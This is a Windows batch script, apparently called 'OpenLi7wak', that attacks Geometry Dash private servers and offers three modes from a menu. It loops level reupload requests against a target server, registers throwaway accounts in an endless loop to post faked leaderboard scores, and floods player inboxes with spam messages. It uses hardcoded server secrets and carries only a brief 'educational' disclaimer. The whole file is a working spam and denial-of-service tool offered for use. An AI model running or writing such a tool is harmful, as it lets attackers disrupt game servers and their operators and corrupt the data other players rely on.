@echo off
setlocal enabledelayedexpansion
set state=start
:cl
cls
:::    ____                   _      _ ______              _    
:::   / __ \                 | |    (_)____  |            | |   
:::  | |  | |_ __   ___ _ __ | |     _    / /_      ____ _| | __
:::  | |  | | '_ \ / _ \ '_ \| |    | |  / /\ \ /\ / / _` | |/ /
:::  | |__| | |_) |  __/ | | | |____| | / /  \ V  V / (_| |   < 
:::   \____/| .__/ \___|_| |_|______|_|/_/    \_/\_/ \__,_|_|\_\
:::         | |                                                 
:::         |_|     
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A             
echo.          
echo For EDUCATIONAL purpose! ONLY on your OWN GDPS
echo GDPS Owner may publicly disclose your IP address if the tool is used without EXPLICIT CONSENT
goto %state%                                                                                  
:start
echo --- CHOOSE OPTION ---
echo [1] Reupload SPAM
echo [2] Leaderboard DoS
echo [3] Message SPAM
echo [4] Exit
set /p op=
if %op%==1 set state=ru
if %op%==2 set state=ls
if %op%==3 set state=ms
if %op%==4 exit
goto cl

:ms
set state=start
set /a nb=0 > nul
set /p host=Host (https://gdps.com/database): 
set /p pass=Please give a password to be used: 
for /f "delims=" %%a in ('encode.exe %pass%') do set "password=%%a"
echo Running... Sit tight...
:s
set /a nb+=1 > nul
set username=Li7wak %random%%random%
curl %host%/tools/account/registerAccount.php -X POST -d "username=%username%&password=%pass%&proxy=1&repeatpassword=%pass%&email=a@a.a&repeatemail=a@a.a" > nul
set "iatecement=curl %host%/accounts/loginGJAccount.php -X POST -d "udid=1^&userName=%username%^&password=%pass%^&secret=Wmfv3899gc9""
set "response="
for /f "usebackq delims=" %%a in (`!iatecement!`) do (
  set "response=%%a"
)
for /f "tokens=1 delims=," %%a in ("%response%") do (
  set "aid=%%a"
)
curl -X POST -d "accountID=%aid%&gjp=%password%&toAccountID=%nb%&subject=TGk3d2Fr&body=TGk3d2Fr&secret=Wmfd2893gb7" %host%/uploadGJMessage20.php > nul
echo.
echo Ran
goto :s
goto cl

:ls
set state=start
set /p host=Host (https://gdps.com/database): 
set /p pass=Please give a password to be used: 
for /f "delims=" %%a in ('encode.exe %pass%') do set "password=%%a"
echo Running... Sit tight...
:s
set username=Li7wak %random%%random%
curl %host%/tools/account/registerAccount.php -X POST -d "username=%username%&password=%pass%&proxy=1&repeatpassword=%pass%&email=a@a.a&repeatemail=a@a.a" > nul
set "iatecement=curl %host%/accounts/loginGJAccount.php -X POST -d "udid=1^&userName=%username%^&password=%pass%^&secret=Wmfv3899gc9""
set "response="
for /f "usebackq delims=" %%a in (`!iatecement!`) do (
  set "response=%%a"
)
for /f "tokens=1 delims=," %%a in ("%response%") do (
  set "aid=%%a"
)
curl -X POST -d "accountID=%aid%&gjp=%password%&userName=%username%&stars=99999&demons=99999&diamonds=99999&icon=107&color1=29&color2=6&iconType=0&coins=150&userCoins=6969&secret=Wmfd2893gb7" %host%/updateGJUserScore22.php > nul
echo.
echo Ran
goto :s
goto cl
:ru
echo You will provide the following info: Bug URL (gdps containing the bug code)
echo and the target GDPS to spam (eg https://anygdps.ps.fhgdps.com)
echo.
set /p origin=Enter the bug GDPS url (full path): 
set /p target=Enter the GDPS url: 
echo Are the following information correct?
echo.
echo Origin: %origin%
echo Target: %target%
echo [y]es / [N]o
set /p conf1=
if %conf1%==y goto a
if %conf1%==Y goto a
set state=ru
goto cl
:a
curl -X POST -d "levelid=%random%&server=%origin%&proxy=1&debug=0" %target%/tools/levelReupload.php
goto :a
set state=start
goto cl
endlocal
pause>nul